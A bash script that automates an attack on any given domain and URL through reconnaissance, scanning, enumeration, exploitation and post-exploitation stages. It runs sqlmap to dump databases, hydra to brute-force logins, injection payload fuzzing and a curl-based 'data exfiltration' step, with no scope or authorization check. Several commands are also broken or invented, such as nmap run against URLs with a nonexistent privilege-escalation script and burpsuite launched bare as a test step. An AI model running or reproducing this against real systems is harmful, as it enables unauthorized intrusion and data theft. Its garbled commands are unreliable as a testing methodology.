#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0 -d <target_domain> -u <target_url>"
    exit 1
}

# Function for reconnaissance
reconnaissance() {
    local target_domain=$1
    echo "[1] Reconnaissance"
    
    echo "[1.1] WHOIS Lookup"
    whois "$target_domain"
    
    echo "[1.2] Reverse IP Lookup"
    reverseip -d "$target_domain"
    
    echo "[1.3] DNS Enumeration"
    dnsenum "$target_domain"
    
    echo "[1.4] Subdomain Enumeration"
    sublist3r -d "$target_domain"
    
    echo "[1.5] Port Scanning"
    nmap -p- "$target_domain"
    
    echo "[1.6] Service Detection"
    nmap -sV -p- "$target_domain"
    
    echo "[1.7] Banner Grabbing"
    nmap -sV --script=banner -p80,443 "$target_domain"
    
    echo "[1.8] Vulnerability Scanning"
    nmap --script vuln -p- "$target_domain"
    
    echo "[1.9] Web Server Fingerprinting"
    whatweb -v "$target_domain"
    
    echo "[1.10] Technology Stacks Identification"
    wappalyzer -u "https://$target_domain"
    
    echo "[1.11] SSL/TLS Configuration Testing"
    testssl.sh "$target_domain"
}

# Function for scanning
scanning() {
    local target_url=$1
    echo "[2] Scanning"
    
    echo "[2.1] Content Discovery"
    gobuster dir -u "$target_url" -w wordlist.txt
    
    echo "[2.2] Directory and File Enumeration"
    dirbuster -u "$target_url" -w wordlist.txt
    
    echo "[2.3] Open Redirect Testing"
    gospider -S "$target_url" -o open_redirects.txt
    
    echo "[2.4] Parameter Enumeration"
    ffuf -u "$target_url/FUZZ" -w payloads/parameters.txt
    
    echo "[2.5] HTTP Method Enumeration"
    http-methods -u "$target_url"
    
    echo "[2.6] Subdomain Enumeration with Sublist3r"
    sublist3r -d "$(echo "$target_url" | awk -F/ '{print $3}')" -o subdomains.txt
    
    echo "[2.7] Virtual Host Enumeration"
    ffuf -u "$target_url/FUZZ" -w payloads/vhosts.txt
    
    echo "[2.8] Port Scanning with Nmap"
    nmap -p- "$target_url"
    
    echo "[2.9] Port Scanning with Masscan"
    masscan -p1-65535 "$target_url"
    
    echo "[2.10] Service Version Detection"
    nmap -sV -p- "$target_url"
}

# Function for enumeration
enumeration() {
    local target_domain=$1
    local target_url=$2
    echo "[3] Enumeration"
    
    echo "[3.1] User Enumeration"
    theHarvester -d "$target_domain" -b google -l 500
    
    echo "[3.2] API Endpoint Enumeration"
    burpsuite
    
    echo "[3.3] Email Verification"
    emailverify -e email@"$target_domain"
    
    echo "[3.4] Subdomain Takeover Testing"
    subjack -w subdomains.txt -t 20 -o subjack_results.txt
    
    echo "[3.5] CORS Testing"
    corsy -u "$target_url"
    
    echo "[3.6] SSRF Testing"
    ssrfmap -u "$target_url"
    
    echo "[3.7] Clickjacking Testing"
    clickjacking -u "$target_url"
    
    echo "[3.8] Content Security Policy (CSP) Testing"
    csp-scan -u "$target_url"
    
    echo "[3.9] Sensitive Data Exposure Testing"
    feroxbuster -u "$target_url" -w wordlist.txt
    
    echo "[3.10] XSS and SQL Injection Testing"
    xsstrike -u "$target_url"
    
    echo "[3.11] Testing for Insecure HTTP Methods"
    http-methods -u "$target_url"
    
    echo "[3.12] Local File Inclusion (LFI) Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/lfi.txt
    
    echo "[3.13] Remote File Inclusion (RFI) Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/rfi.txt
    
    echo "[3.14] Server-Side Template Injection (SSTI) Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/ssti.txt
    
    echo "[3.15] Server-Side JavaScript Injection (SSJI) Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/ssji.txt
    
    echo "[3.16] HTTP Header Inspection"
    curl -I "$target_url"
    
    echo "[3.17] HTTPS Security Testing"
    sslyze "$target_url"
}

# Function for exploitation
exploitation() {
    local target_url=$1
    echo "[4] Exploitation"
    
    echo "[4.1] SQL Injection Testing"
    sqlmap -u "$target_url/vulnerable-endpoint" --dbs
    
    echo "[4.2] XSS Testing"
    xsstrike -u "$target_url/vulnerable-endpoint"
    
    echo "[4.3] Command Injection Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/command_injection.txt
    
    echo "[4.4] CSRF Testing"
    csrf_poc -u "$target_url/vulnerable-endpoint"
    
    echo "[4.5] Local File Inclusion (LFI) Testing"
    burpsuite
    
    echo "[4.6] Remote File Inclusion (RFI) Testing"
    burpsuite
    
    echo "[4.7] Server-Side Template Injection (SSTI) Testing"
    burpsuite
    
    echo "[4.8] Server-Side JavaScript Injection (SSJI) Testing"
    burpsuite
    
    echo "[4.9] Sensitive Data Exposure Testing"
    feroxbuster -u "$target_url" -w wordlist.txt
    
    echo "[4.10] Open Redirect Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/open_redirect.txt
    
    echo "[4.11] Clickjacking Testing"
    burpsuite
    
    echo "[4.12] HTTP Response Splitting Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/http_response_splitting.txt
    
    echo "[4.13] Directory Traversal Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/directory_traversal.txt
    
    echo "[4.14] Session Fixation Testing"
    burpsuite
    
    echo "[4.15] Session Management Testing"
    burpsuite
    
    echo "[4.16] JWT Manipulation Testing"
    jwt_tool -i "$target_url/vulnerable-endpoint"
    
    echo "[4.17] Brute Force Testing"
    hydra -L usernames.txt -P passwords.txt "$target_url"
    
    echo "[4.18] API Testing"
    postman
    
    echo "[4.19] File Upload Vulnerability Testing"
    burpsuite
    
    echo "[4.20] XML External Entity (XXE) Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/xxe.txt
    
    echo "[4.21] Cross-Site Request Forgery (CSRF) Testing"
    csrf_poc -u "$target_url/vulnerable-endpoint"
    
    echo "[4.22] Server-Side Request Forgery (SSRF) Testing"
    ssrfmap -u "$target_url"
    
    echo "[4.23] Broken Authentication Testing"
    burpsuite
    
    echo "[4.24] Broken Access Control Testing"
    burpsuite
}

# Function for post-exploitation
post_exploitation() {
    local target_url=$1
    echo "[5] Post-Exploitation"
    
    echo "[5.1] Privilege Escalation"
    nmap --script priv esc -p- "$target_url"
    
    echo "[5.2] Data Exfiltration"
    curl -X POST -d @data.txt "$target_url/exfiltrate"
    
    echo "[5.3] Network Mapping"
    nmap -sP "$target_url"
    
    echo "[5.4] SMTP Relay Testing"
    smtp-user-enum -M VRFY -u usernames.txt -t "$target_url"
    
    echo "[5.5] Web Application Vulnerability Scanning"
    burpsuite
    
    echo "[5.6] Cookie Security Testing"
    cookie-scan -u "$target_url"
    
    echo "[5.7] Log Injection Testing"
    ffuf -u "$target_url/FUZZ" -w payloads/log_injection.txt
    
    echo "[5.8] API Endpoints Testing"
    postman
    
    echo "[5.9] Web Server Configuration Testing"
    nmap --script http-config -p80,443 "$target_url"
}

# Main script execution
while getopts ":d:u:" opt; do
    case ${opt} in
        d )
            target_domain=$OPTARG
            ;;
        u )
            target_url=$OPTARG
            ;;
        \? )
            usage
            ;;
    esac
done
shift

# Ensure target domain or URL is set
if [ -z "$target_domain" ] || [ -z "$target_url" ]; then
    usage
fi

# Run the different stages
reconnaissance "$target_domain"
scanning "$target_url"
enumeration "$target_domain" "$target_url"
exploitation "$target_url"
post_exploitation "$target_url"
